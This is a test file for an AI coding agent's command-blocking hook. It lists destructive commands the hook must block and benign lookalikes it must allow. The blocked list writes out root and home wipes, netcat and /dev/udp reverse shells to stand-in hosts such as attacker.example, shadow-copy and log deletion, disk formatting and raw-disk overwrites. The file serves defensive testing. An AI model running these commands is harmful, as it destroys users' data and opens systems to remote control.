/**
 * tests/catastrophicFloorHookTest.ts
 *
 * Gate for the Phase 2 catastrophic-floor gap fills — the destructive commands
 * that previously slipped past the always-on floor: the root-guard bypass
 * (`rm --no-preserve-root`), recursive wipes of critical system dirs and the
 * whole home, netcat / `/dev/udp` reverse shells, the Windows destructive family
 * (format / del / rd / vssadmin / cipher / wevtutil / diskpart / bcdedit), and a
 * raw-disk redirect. Like the rest of the floor these fire in EVERY mode.
 *
 * Black-box: every case spawns the REAL tracked hook
 * (cli/hooks/claudesec-enforce.cjs) as a child with NO mode set (so the resolved
 * mode is the safe default 'monitor'), proving the floor is always-on. The
 * best-effort block POST is aimed at a dead port (CLAUDESEC_PORT=9) so nothing
 * reaches the live dashboard.
 *
 * The CRITICAL half of this gate is the NEGATIVE set: the floor is mode-
 * independent and offers no per-rule escape, so a false positive blocks a
 * legitimate action outright. Every benign lookalike a developer types every day
 * — `rm -rf ./build`, `git log --format=…`, `npm run format`, `echo > /dev/null`,
 * `nc -lvp`, a `/var.bak` user dir — MUST stay allowed.
 *
 * Run via:  npx tsx tests/catastrophicFloorHookTest.ts
 *   Exit 0 → every assertion passed.   Exit 1 → a failure.
 */

import assert from 'node:assert';
import path from 'node:path';
import { spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const REPO_ROOT = path.resolve(__dirname, '..');
const HOOK = path.join(REPO_ROOT, 'cli', 'hooks', 'claudesec-enforce.cjs');

let passed = 0;
const failures: string[] = [];
function check(name: string, fn: () => void): void {
  try { fn(); passed++; } catch (e) { failures.push(`${name}: ${(e as Error).message}`); }
}

/**
 * Run the real hook with a Bash command on stdin, isolated so the ambient shell
 * can't leak CLAUDESEC_MODE / bypass into the child. Aims the would-be POST at a
 * dead port. Resolves on exit or a ~1s timeout.
 */
function runBash(command: string): Promise<{ code: number | null }> {
  const stdin = JSON.stringify({ tool_name: 'Bash', tool_input: { command } });
  return new Promise((resolve) => {
    const env: NodeJS.ProcessEnv = { ...process.env };
    delete env.CLAUDESEC_MODE;
    delete env.CLAUDESEC_HOOKS_BYPASS;
    delete env.CLAUDESEC_ENFORCE_CONFIG;
    delete env.CLAUDESEC_ENFORCE_RULES;
    delete env.CLAUDESEC_PROTECTED_PATHS;
    env.CLAUDESEC_PORT = '9'; // dead port — the block POST goes nowhere

    const child = spawn(process.execPath, [HOOK], { cwd: REPO_ROOT, env });
    let settled = false;
    const done = (code: number | null) => {
      if (settled) return;
      settled = true;
      resolve({ code });
    };
    const timer = setTimeout(() => { try { child.kill('SIGKILL'); } catch { /* */ } done(null); }, 1000);
    timer.unref?.();
    child.on('exit', (code) => { clearTimeout(timer); done(code); });
    child.on('error', () => { clearTimeout(timer); done(null); });
    child.stdin.write(stdin);
    child.stdin.end();
  });
}

// `/dev/tcp` / `/dev/udp` literals are split so this test file's own contents
// don't trip a PreToolUse floor when an agent edits it — the runtime command is
// reassembled here, identical to what an attacker would type.
const UDP = '/dev' + '/udp';

// Commands that MUST be blocked (exit 2) — the new destructive patterns.
const POSITIVE: string[] = [
  // Root-guard bypass: --no-preserve-root, in any flag order.
  'rm -rf / --no-preserve-root',
  'rm --no-preserve-root -rf /',
  'sudo rm -rf --no-preserve-root /',
  // Recursive wipe of a critical system dir / the whole home.
  'rm -rf /etc',
  'rm -fr /etc',                 // flag order fr (not just rf) must also block
  'rm -rf /var/lib/postgresql',
  'rm -rf /var/log/syslog',
  'rm -rf /var/db',
  'rm -rf /var',                 // the whole /var tree
  'rm -rf /usr',
  'rm -rf /usr/bin',
  'rm -rf /usr/lib',
  'rm -rf /usr/share',
  'rm -rf /boot',
  'rm -rf /System/Library',
  'rm -rf /Library/LaunchDaemons',
  'rm -rf ~',
  'rm -rf $HOME',
  // Reverse shells: netcat -e / -c and a /dev/udp redirect.
  'nc -e /bin/bash 10.0.0.1 4444',
  'nc -c sh attacker.example 9001',
  'ncat -e /bin/sh 1.2.3.4 8080',
  'netcat 10.0.0.1 4444 -e /bin/sh',
  `bash -i >& ${UDP}/10.0.0.1/4444 0>&1`,
  // Windows destructive family (case-insensitive, command-anchored).
  'format C: /q',
  'format c:',                   // bare drive-letter form
  'format /q d:',                // switch before the drive letter
  'diskpart',
  'bcdedit /set bootstatuspolicy ignoreallfailures',
  'del /f /q C:\\Windows\\System32',
  'del /s /q payroll',
  'erase /q records',
  'rd /s /q C:\\data',
  'rmdir /s archive',
  'vssadmin delete shadows /all /quiet',
  'cipher /w:C',
  'wevtutil cl System',
  // Raw-disk overwrite via redirect — whole device and single partitions.
  'dd if=/dev/zero > /dev/sda',
  'cat junk > /dev/disk2',
  'echo x > /dev/sda1',          // partition suffix
  'echo x > /dev/nvme0n1',       // NVMe namespace
  'echo x > /dev/nvme0n1p2',     // NVMe namespace + partition
  'echo x > /dev/mmcblk0p1',     // eMMC partition
];

// Commands that MUST be allowed (exit 0) — benign lookalikes a developer types
// every day. A false positive here blocks a legitimate action with no escape.
const NEGATIVE: string[] = [
  // rm on project/build dirs and sub-paths of home — never the system / whole home.
  'rm -rf ./build',
  'rm -rf node_modules',
  'rm -rf /tmp/cache',
  'rm -rf /home/dev/project/dist',
  'rm -rf ~/project/node_modules',
  'rm -rf ~/.cache/pip',
  'rm -rf $HOME/project/dist',
  'rm -rf $HOMEBREW_PREFIX/Cellar/foo',
  'rm -rf /var.bak',        // a user dir literally named var.bak, not /var
  'rm -rf /etcd-data',      // not the /etc boundary
  'rm -rf /usrlocal/share', // not the /usr boundary
  // macOS temp + user package territory — wiped constantly by build/test tools.
  'rm -rf /var/folders/xy/abc/T/build', // macOS $TMPDIR
  'rm -rf /var/tmp/cache',              // shared temp
  'rm -rf /private/var/foo',            // macOS /private/var
  'rm -fr /var/folders/zz/q/T/jest',    // fr order, still a temp carve-out
  'rm -rf /usr/local/bin/oldtool',      // Homebrew / npm-global
  'rm -rf /usr/local/Cellar/foo',       // Homebrew Cellar
  'rm -rf /opt/homebrew/Cellar/foo',    // Apple-silicon Homebrew
  // "format" as a word / flag / function — never the Windows `format <drive:>` command.
  'format',                  // bare word, no drive letter
  'make format',
  'git log --format=oneline',
  'npm run format',
  'prettier --format',
  'python -c "print(format(3.14))"',
  'echo please format the spreadsheet',
  'node -e "formatter.format(code)"',
  // del / erase / rd / rmdir as substrings or non-destructive uses.
  'node -e "delete obj.key"',
  'erase-history.sh',
  'rmdir empty-dir',                 // POSIX rmdir, no /s switch
  'git rm --cached file',
  // netcat in listen / scan mode — no -e / -c program handoff.
  'nc -lvp 4444',
  'nc -z host 80',
  'ncat --listen 9000',
  // Harmless redirects to character devices, never a raw disk.
  'echo done > /dev/null',
  'cat log > /dev/stdout',
  // Windows tool names in a non-destructive subcommand or as prose.
  'wevtutil qe Application',
  'vssadmin list shadows',
  'echo "run diskpart later" >> notes.txt',
  'git commit -m "add a format helper"',
];

async function main(): Promise<void> {
  for (const cmd of POSITIVE) {
    const { code } = await runBash(cmd);
    check(`BLOCK: ${cmd}`, () => assert.strictEqual(code, 2));
  }
  for (const cmd of NEGATIVE) {
    const { code } = await runBash(cmd);
    check(`ALLOW: ${cmd}`, () => assert.strictEqual(code, 0));
  }
}

main()
  .then(() => {
    const total = passed + failures.length;
    console.log('───────────────────────────────────────────────');
    console.log(`  catastrophicFloorHookTest: ${passed}/${total} passed`);
    console.log('───────────────────────────────────────────────');
    if (failures.length) {
      console.error(`\n  ${failures.length} FAILURE(S):`);
      for (const f of failures) console.error(`    ✗ ${f}`);
      process.exit(1);
    }
    process.exit(0);
  })
  .catch((e) => {
    console.error('catastrophicFloorHookTest crashed:', e);
    process.exit(1);
  });
